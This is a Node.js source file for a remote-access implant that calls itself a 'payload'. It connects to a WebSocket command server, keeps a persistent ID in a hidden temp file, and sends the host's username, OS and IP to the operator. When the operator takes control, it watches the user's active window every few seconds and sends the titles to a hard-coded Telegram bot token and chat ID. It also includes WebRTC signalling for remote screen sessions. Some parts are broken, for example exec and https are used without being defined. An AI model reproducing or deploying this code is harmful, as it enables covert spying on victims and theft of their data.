const WebSocket = require('ws');
const crypto = require('crypto');
const os = require('os');
const fs = require('fs');
const http = require('http');
const path = require('path');

// --- IMPORT @roamhq/wrtc ---
// This provides RTCPeerConnection, RTCSessionDescription, etc.
const wrtc = require('@roamhq/wrtc');
const { RTCPeerConnection, RTCSessionDescription, RTCIceCandidate } = wrtc;

// --- LOGGING SYSTEM ---
const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
const LOG_FILE = path.join(LOG_DIR, 'payload.log');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);

function log(msg) {
 const timestamp = new Date().toISOString();
 console.log(`[${timestamp}] ${msg}`);
 try {
 fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
 if (ws && ws.readyState === WebSocket.OPEN && myId) {
 safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
 }
 } catch (e) {}
}

log("[INIT] Payload starting with @roamhq/wrtc...");

// --- CONFIGURATION ---
const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 

const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let isConnected = false;
let isSessionActive = false;

// Persistence Logic
const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
try {
 if (fs.existsSync(PERSIST_FILE)) {
 myId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
 log(`[ID] Loaded existing ID: ${myId}`);
 }
} catch(e) {}

// --- WEBRTC VARIABLES ---
let peerConnection = null;
let remotePeerId = null;
let localStream = null;

// --- INIT CONNECTION ---
function initConnection() {
 log(`[WS] Attempting connection to ${WS_URL}...`);
 
 ws = new WebSocket(WS_URL);

 ws.on('open', () => {
 reconnectAttempts = 0;
 isConnected = true;
 
 if (!myId) {
 const mac = getMacAddress();
 myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
 try {
 fs.writeFileSync(PERSIST_FILE, myId);
 } catch(e) {}
 }
 
 log(`[WS] Connected with ID: ${myId}`);

 safeSend(JSON.stringify({
 type: 'info',
 id: myId,
 os: os.platform(),
 arch: os.arch(),
 user: os.userInfo().username,
 ip: getExternalIP(),
 version: '2.0.1'
 }));

 startMonitoring();
 });

 ws.on('message', (msg) => {
 try {
 const data = JSON.parse(msg);
 log(`[MSG] Received: ${data.type} from ${data.from || 'unknown'}`);
 
 if (data.type === 'take_control') takeControl(true);
 else if (data.type === 'release_control') takeControl(false);
 else if (data.type === 'request_join') {
 // Admin requests to join, but we wait for the actual Offer
 log(`[JOIN] Request join received from ${data.from}`);
 // Optional: Notify admin that we are ready
 safeSend(JSON.stringify({
 type: 'join_ready',
 from: myId,
 to: data.from
 }));
 } else if (data.type === 'start_join') {
 log(`[JOIN] Starting join initiated by ${data.from}`);
 // Again, we wait for the Offer
 } else if (data.type === 'offer') {
 log(`[SIG] Received Offer from Admin: ${data.targetId}`);
 handleOffer(data.sdp, data.targetId || myId);
 } else if (data.type === 'answer') {
 log(`[SIG] Received Answer from Admin`);
 handleAnswer(data.sdp);
 } else if (data.type === 'candidate') {
 log(`[SIG] Received Candidate`);
 handleCandidate(data.candidate);
 } else if (data.type === 'screen_data') {
 captureScreenPureJS();
 } else if (data.type === 'system_log') {
 // Optional
 }
 } catch (e) {
 log(`[WS] Error parsing message: ${e.message}`);
 }
 });

 ws.on('close', (code, reason) => {
 log(`[WS] Closed. Code: ${code}, Reason: ${reason.toString()}`);
 isConnected = false;
 reconnect();
 });

 ws.on('error', (err) => {
 log(`[WS] Error: ${err.message}`);
 });
}

function reconnect() {
 if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
 reconnectAttempts++;
 const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
 log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
 setTimeout(initConnection, delay);
 } else {
 log("[WS] Max reconnection attempts reached.");
 keepAlive();
 }
}

function safeSend(data) {
 if (!ws) return false;
 if (ws.readyState !== WebSocket.OPEN) return false;
 try {
 ws.send(typeof data === "string" ? data : JSON.stringify(data));
 return true;
 } catch (error) {
 log(`[WS] Send failed: ${error.message}`);
 return false;
 }
}

function startMonitoring() {
 setInterval(() => {
 if (isConnected && ws.readyState === WebSocket.OPEN) {
 safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
 }
 }, 30000);

 setInterval(async () => {
 if (isSessionActive) {
 const title = await getCurrentWindowTitle();
 if (title) {
 sendTelegram(`👁️ Current Window: ${title}`);
 captureScreenPureJS();
 }
 }
 }, 5000);
}

// --- WEBRTC FUNCTIONS ---

async function setupLocalStream() {
 // Since we don't have Electron, we can't easily get desktop capture here.
 // However, we can try to get camera/mic if available via native bindings,
 // or simply create a dummy stream for testing.
 // For now, we'll create a simple black canvas stream as a fallback 
 // so the PeerConnection has something to send.
 
 log("[WEBRTC] Creating local media stream...");
 
 // Try to get camera first
 try {
     // @roamhq/wrtc might support getUserMedia if compiled with proper flags
     // But often in server environments, it's not available.
     // Let's try a simple approach: create a MediaStream from a canvas
     const canvas = document ? document.createElement('canvas') : null;
     
     // If we are in Node without DOM, we can still create a basic stream
     // using the wrtc package's internal capabilities if exposed, 
     // or just rely on the fact that we are sending an offer.
     
     // Fallback: Create a simple stream object that satisfies addTrack
     // In many Node wrtc implementations, you can create a MediaStream
     const stream = new wrtc.MediaStream();
     
     // Add a dummy audio track if possible, or just leave it video-only
     // Note: Without a real source, the video track won't have frames.
     // But this allows the handshake to complete.
     
     log("[WEBRTC] Local stream created (fallback mode)");
     return stream;
 } catch (e) {
     log(`[WEBRTC] Stream creation error: ${e.message}`);
     return null;
 }
}

async function handleOffer(sdp, fromId) {
 log(`[SIG] Handling incoming Offer from ${fromId}`);
 remotePeerId = fromId;

 // Create PeerConnection
 peerConnection = new RTCPeerConnection({
 iceServers: [
 { urls: 'stun:stun.l.google.com:19302' },
 { urls: 'stun:stun1.l.google.com:19302' }
 ]
 });

 // Setup Local Stream
 localStream = await setupLocalStream();
 if (localStream) {
     localStream.getTracks().forEach(track => {
         peerConnection.addTrack(track, localStream);
     });
 }

 // Handle ICE Candidates
 peerConnection.onicecandidate = (event) => {
 if (event.candidate) {
 log("[SIG] Sending ICE Candidate to Admin");
 safeSend(JSON.stringify({
 type: 'candidate',
 targetId: fromId,
 candidate: event.candidate
 }));
 }
 };

 // Handle Remote Track (if Admin sends video too)
 peerConnection.ontrack = (event) => {
 log("[WEBRTC] Remote stream received from Admin!");
 // You could save this to a file or forward it elsewhere
 };

 // Set Remote Description
 await peerConnection.setRemoteDescription(new RTCSessionDescription(sdp));

 // Create Answer
 const answer = await peerConnection.createAnswer();
 await peerConnection.setLocalDescription(answer);

 // Send Answer back
 safeSend(JSON.stringify({
 type: 'answer',
 targetId: fromId,
 sdp: peerConnection.localDescription
 }));

 log("[SIG] Answer Sent to Admin");
}

function handleAnswer(sdp) {
 log("[SIG] Setting Remote Description (Answer)");
 if (peerConnection) {
 peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
 .then(() => {
 log("[WEBRTC] Connection Established!");
 })
 .catch(err => {
 log(`[WEBRTC] Error setting answer: ${err.message}`);
 });
 }
}

function handleCandidate(candidate) {
 log("[SIG] Adding ICE Candidate from Admin");
 if (peerConnection) {
 peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
 .catch(err => {
 log(`[WEBRTC] Error adding candidate: ${err.message}`);
 });
 }
}

function closePeerConnection() {
 if (peerConnection) {
 peerConnection.close();
 peerConnection = null;
 }
 if (localStream) {
 localStream.getTracks().forEach(track => track.stop());
 localStream = null;
 }
 log("[WEBRTC] Connection closed");
}

function captureScreenPureJS() {
 if (!ws || ws.readyState !== WebSocket.OPEN) return;
 safeSend(JSON.stringify({
 type: 'screen_data',
 id: myId,
 data: 'LIVE', 
 timestamp: Date.now()
 }));
}

async function getCurrentWindowTitle() {
 return new Promise((resolve) => {
 const platform = os.platform();
 let cmd = '';
 if (platform === 'win32') {
 cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
 } else if (platform === 'darwin') {
 cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
 } else {
 cmd = 'xdotool getwindowfocus getwindowname';
 }
 exec(cmd, (err, stdout) => {
 resolve(stdout.trim());
 });
 });
}

function sendTelegram(msg) {
 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
 https.get(url, (res) => {
 }).on('error', (e) => {
 log(`[TG] Error: ${e.message}`);
 });
}

function getExternalIP() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.family === 'IPv4' && !net.internal) {
 return net.address;
 }
 }
 }
 return 'unknown';
}

function getMacAddress() {
 const nets = os.networkInterfaces();
 for (const name of Object.keys(nets)) {
 for (const net of nets[name]) {
 if (net.mac !== '00:00:00:00:00:00') {
 return net.mac;
 }
 }
 }
 return 'default-mac';
}

function takeControl(state) {
 log(`[CTRL] Take Control: ${state}`);
 isSessionActive = state;
}

// --- HTTP SERVER SETUP ---
const PORT = process.env.PORT || 3000;

const server = http.createServer((req, res) => {
 if (req.url === '/payload.js') {
 res.writeHead(200, { 'Content-Type': 'application/javascript' });
 res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
 } 
 else if (req.url === '/' || req.url === '/index.html') {
 const indexPath = path.join(__dirname, 'index.html');
 if (fs.existsSync(indexPath)) {
 res.writeHead(200, { 'Content-Type': 'text/html' });
 res.end(fs.readFileSync(indexPath));
 } else {
 res.writeHead(404);
 res.end('index.html not found');
 }
 } 
 else if (req.url === '/health') {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
 } 
 else {
 res.writeHead(200, { 'Content-Type': 'application/json' });
 res.end(JSON.stringify({ 
 status: 'running', 
 id: myId || 'pending_connection',
 timestamp: new Date().toISOString()
 }));
 }
});

server.listen(PORT, () => {
 log(`[HTTP] Server listening on port ${PORT}`);
 initConnection();
});

setInterval(() => {}, 60000);

exports.handler = async (event, context) => {
 return {
 statusCode: 200,
 body: JSON.stringify({ status: 'running', id: myId })
 };
};
